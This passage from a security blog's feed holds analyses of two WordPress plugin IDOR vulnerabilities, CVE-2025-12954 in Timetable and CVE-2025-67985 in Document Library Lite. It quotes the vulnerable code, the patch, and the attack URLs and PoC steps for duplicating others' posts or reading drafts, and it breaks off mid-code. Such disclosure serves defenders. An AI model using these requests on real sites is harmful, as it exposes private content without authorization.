directly from &lt;code&gt;$post_id&lt;/code&gt; passed via URL &lt;strong&gt;without ownership restrictions&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;post.php?action=mptt_duplicate_event&amp;amp;post=123&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Just by guessing or changing the &lt;code&gt;post&lt;/code&gt; ID in the URL, a user with &lt;code&gt;edit_posts&lt;/code&gt; can still:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;duplicate someone else&amp;rsquo;s post&lt;/li&gt;&#xA;&lt;li&gt;duplicate a published post&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Because WordPress &lt;strong&gt;does not automatically check permissions in the &lt;code&gt;post_action_*&lt;/code&gt; hook&lt;/strong&gt;, the entire access control depends on the &lt;code&gt;current_user_can()&lt;/code&gt; snippet in the plugin.&lt;/p&gt;&#xA;&lt;p&gt;Instead of using &lt;code&gt;edit_posts&lt;/code&gt;, the patch switched to checking permissions on each specific object using meta capability:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;current_user_can( &amp;#39;edit_post&amp;#39;, $post_id )&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This check forces WordPress to verify:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Whether the user has permission to edit the post referenced by &lt;code&gt;$post_id&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Whether the post belongs to the current user&lt;/li&gt;&#xA;&lt;li&gt;The post status (draft, pending, published, private)&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Thanks to this, users can no longer arbitrarily change the post ID in the URL to duplicate someone else&amp;rsquo;s post, and the &lt;strong&gt;IDOR&lt;/strong&gt; vulnerability is fixed.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-21-cve-2025-12954/diff.png&#34; title=&#34;The patch changes&#34; data-thumbnail=&#34;/posts/2025-12-21-cve-2025-12954/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff&lt;/h2&gt;&lt;p&gt;The patch changes&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-21-cve-2025-12954/diff.png&#39; alt=&#34;Diff&#34; height=&#34;679&#34; width=&#34;1788&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;The patch changes&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;&#xA;A[&amp;#34;Authenticated user (Contributor&amp;#43;)&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Click Duplicate link or craft URL manually&amp;#34;]&#xA;B --&amp;gt; C[&amp;#34;Request: /wp-admin/post.php?action=mptt_duplicate_event&amp;amp;post={target_post_id}&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;WordPress loads post.php&amp;#34;]&#xA;D --&amp;gt; E[&amp;#34;do_action(&amp;#39;post_action_mptt_duplicate_event&amp;#39;, post_id)&amp;#34;]&#xA;E --&amp;gt; F[&amp;#34;post_action_mptt_duplicate_event(post_id)&amp;#34;]&#xA;F --&amp;gt; G[&amp;#34;get_post(post_id) without ownership check&amp;#34;]&#xA;G --&amp;gt; H[&amp;#34;Check nonce &amp;#43; current_user_can(&amp;#39;edit_posts&amp;#39;)&amp;#34;]&#xA;H --&amp;gt; I[&amp;#34;Permission granted (generic capability)&amp;#34;]&#xA;I --&amp;gt; J[&amp;#34;Duplicate target post (content, meta, taxonomy, custom table)&amp;#34;]&#xA;J --&amp;gt; K[&amp;#34;Create new draft owned by attacker&amp;#34;]&#xA;K --&amp;gt; L[&amp;#34;Redirect to edit screen of duplicated post&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Login with a Contributor account&lt;/li&gt;&#xA;&lt;li&gt;Access &lt;code&gt;Timetable&lt;/code&gt; &amp;gt; &lt;code&gt;Events&lt;/code&gt; and click &lt;code&gt;Duplicate&lt;/code&gt; on any event&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-21-cve-2025-12954/poc.gif&#34; title=&#34;PoC&#34; data-thumbnail=&#34;/posts/2025-12-21-cve-2025-12954/poc.gif&#34; data-sub-html=&#34;&lt;h2&gt;PoC&lt;/h2&gt;&lt;p&gt;PoC&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-21-cve-2025-12954/poc.gif&#39; alt=&#34;PoC&#34; height=&#34;644&#34; width=&#34;1916&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;PoC&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The vulnerability stems from the plugin only checking the general &lt;code&gt;edit_posts&lt;/code&gt; permission when duplicating an event, instead of checking permissions on the &lt;strong&gt;specific post&lt;/strong&gt;. Since the &lt;code&gt;post_action_*&lt;/code&gt; hook is not automatically protected by WordPress, low-privileged users (Contributors) can change the &lt;code&gt;post&lt;/code&gt; ID in the URL to duplicate events they do not own, leading to IDOR. The patch fixes this by using the &lt;code&gt;edit_post&lt;/code&gt; meta capability, forcing WordPress to verify permissions on each post.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;edit_posts&lt;/code&gt; is not suitable for protecting operations on specific posts&lt;/li&gt;&#xA;&lt;li&gt;Nonce is not a substitute for permission checks&lt;/li&gt;&#xA;&lt;li&gt;IDs taken from requests are always user-controlled&lt;/li&gt;&#xA;&lt;li&gt;Always use &lt;code&gt;current_user_can( &#39;edit_post&#39;, $post_id )&lt;/code&gt; when operating on a post&lt;/li&gt;&#xA;&lt;li&gt;The &lt;code&gt;post_action_*&lt;/code&gt; hook requires the plugin to control authorization itself&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/idor.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;IDOR&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/mp-timetable/vulnerability/wordpress-timetable-and-event-schedule-plugin-2-4-16-contributor-event-disclosure-via-idor-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Timetable and Event Schedule Plugin &amp;lt;= 2.4.15 is vulnerable to Insecure Direct Object References (IDOR)&lt;/a&gt;&lt;/p&gt;&#xA;</description>
    </item>
    <item>
      <title>CVE-2025-67985 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-12-20-cve-2025-67985/</link>
      <pubDate>Sat, 20 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-12-20-cve-2025-67985/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-20-cve-2025-67985/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;A vulnerability involving &lt;strong&gt;authorization bypass via user-controlled keys&lt;/strong&gt; in the &lt;strong&gt;Document Library Lite&lt;/strong&gt; plugin by &lt;strong&gt;Barn2 Plugins&lt;/strong&gt; allows exploitation of &lt;strong&gt;misconfigured access control security levels&lt;/strong&gt;.&#xA;This vulnerability affects &lt;strong&gt;Document Library Lite&lt;/strong&gt; from &lt;strong&gt;unknown versions&lt;/strong&gt; up to &lt;strong&gt;version 1.1.7 and below&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-67985&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-67985&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Insecure direct object references (IDOR)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 1.1.7&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 1.2.0&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (5.3)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/document-library-lite/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Document Library Lite Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; – &lt;strong&gt;Document Library Lite&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;1.1.6&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;1.2.0&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff tool.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;div class=&#34;alert alert-note&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M0 8a8 8 0 1116 0A8 8 0 010 8zm8-6.5a6.5 6.5.0 100 13 6.5 6.5.0 000-13zM6.5 7.75A.75.75.0 017.25 7h1a.75.75.0 01.75.75v2.75h.25a.75.75.0 010 1.5h-2a.75.75.0 010-1.5h.25v-2h-.25a.75.75.0 01-.75-.75zM8 6a1 1 0 110-2 1 1 0 010 2z&#34;/&gt;&lt;/svg&gt;Note&lt;/p&gt;&lt;p&gt;The vulnerability is officially disclosed as affecting versions up to 1.1.7, but in reality it was already patched in version 1.1.7. We download version 1.1.6 for analysis.&lt;/p&gt;&lt;/div&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The plugin registers the following action hook:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;wp_ajax_nopriv_dll_load_posts&amp;#39;, [ $this, &amp;#39;load_posts&amp;#39; ] );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;wp_ajax_nopriv_&lt;/code&gt; is a hook available to all users (including unauthenticated users). Anyone can call the AJAX action:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;/wp-admin/admin-ajax.php?action=dll_load_posts&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And execute the &lt;code&gt;load_posts()&lt;/code&gt; function:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;const SHORTCODE = &amp;#39;doc_library&amp;#39;;&#xA;public function load_posts() {&#xA;    $args = Options::handle_shortcode_attribute_aliases( $_POST[ &amp;#39;args&amp;#39; ] );&#xA;    $args = shortcode_atts( Options::get_defaults(), $args, self::SHORTCODE );&#xA;&#xA;    $table = new simple_Document_Library( $args );&#xA;    $response = $table-&amp;gt;get_table( &amp;#39;array&amp;#39; );&#xA;&#xA;    // Return the response as JSON&#xA;    wp_send_json($response);   &#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;load_posts()&lt;/code&gt; function calls &lt;code&gt;handle_shortcode_attribute_aliases&lt;/code&gt; with user input from &lt;code&gt;$_POST[&#39;args&#39;]&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function handle_shortcode_attribute_aliases( $atts ) {&#xA;    if ( isset( $atts[&amp;#39;content&amp;#39;] ) ) {&#xA;        $atts[&amp;#39;columns&amp;#39;] = $atts[&amp;#39;content&amp;#39;];&#xA;        unset( $atts[&amp;#39;content&amp;#39;] );&#xA;    }&#xA;&#xA;    if ( isset( $atts[&amp;#39;docs_per_page&amp;#39;] ) ) {&#xA;        $atts[&amp;#39;rows_per_page&amp;#39;] = $atts[&amp;#39;docs_per_page&amp;#39;];&#xA;        unset( $atts[&amp;#39;docs_per_page&amp;#39;] );&#xA;    }&#xA;&#xA;    return $atts;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This function only performs parameter mapping (renaming):&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;content&lt;/code&gt; → &lt;code&gt;columns&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;docs_per_page&lt;/code&gt; → &lt;code&gt;rows_per_page&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Then returns the &lt;code&gt;$atts&lt;/code&gt; array.&lt;/p&gt;&#xA;&lt;p&gt;Next, &lt;code&gt;load_posts()&lt;/code&gt; calls:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$args = shortcode_atts( Options::get_defaults(), $args, self::SHORTCODE );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;to merge default parameters (&lt;code&gt;Options::get_defaults()&lt;/code&gt;) with user-supplied &lt;code&gt;$args&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-20-cve-2025-67985/option.png&#34; title=&#34;Default shortcode options&#34; data-thumbnail=&#34;/posts/2025-12-20-cve-2025-67985/option.png&#34; data-sub-html=&#34;&lt;h2&gt;Option&lt;/h2&gt;&lt;p&gt;Default shortcode options&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-20-cve-2025-67985/option.png&#39; alt=&#34;Option&#34; height=&#34;475&#34; width=&#34;669&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Default shortcode options&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Among them, &lt;code&gt;status&lt;/code&gt; determines which document statuses are displayed.&lt;/p&gt;&#xA;&lt;p&gt;Document status can be changed when creating/editing a document:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-20-cve-2025-67985/status.png&#34; title=&#34;Change status&#34; data-thumbnail=&#34;/posts/2025-12-20-cve-2025-67985/status.png&#34; data-sub-html=&#34;&lt;h2&gt;Status&lt;/h2&gt;&lt;p&gt;Change status&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-20-cve-2025-67985/status.png&#39; alt=&#34;Status&#34; height=&#34;581&#34; width=&#34;1518&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Change status&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;pending&lt;/code&gt; and &lt;code&gt;draft&lt;/code&gt; are non-public document statuses. Only users with sufficient privileges should be able to view them.&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;load_posts()&lt;/code&gt; initializes &lt;code&gt;simple_Document_Library&lt;/code&gt; with user-controlled &lt;code&gt;$args&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$table = new simple_Document_Library( $args );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;validate_options()&lt;/code&gt; is called in the constructor of &lt;code&gt;simple_Document_Library&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function __construct( $args ) {&#xA;    $this-&amp;gt;args = $this-&amp;gt;validate_options( $args );&#xA;    $this-&amp;gt;set_post_args();&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Here, not only the three statuses &lt;code&gt;publish&lt;/code&gt;, &lt;code&gt;pending&lt;/code&gt;, and &lt;code&gt;draft&lt;/code&gt; exist, but also two additional statuses &lt;code&gt;future&lt;/code&gt; and &lt;code&gt;any&lt;/code&gt;, as seen in &lt;code&gt;validate_options()&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function validate_options( $args ) {&#xA;    // Validate all the boolean options in the database&#xA;    $boolean_options = [ &amp;#39;lazy_load&amp;#39;, &amp;#39;lightbox&amp;#39;, &amp;#39;wrap&amp;#39;, &amp;#39;search_on_click&amp;#39; ];&#xA;&#xA;    foreach( $boolean_options as $option ) {&#xA;        $args[ $option ] = is_string( $args[ $option ] ) ? 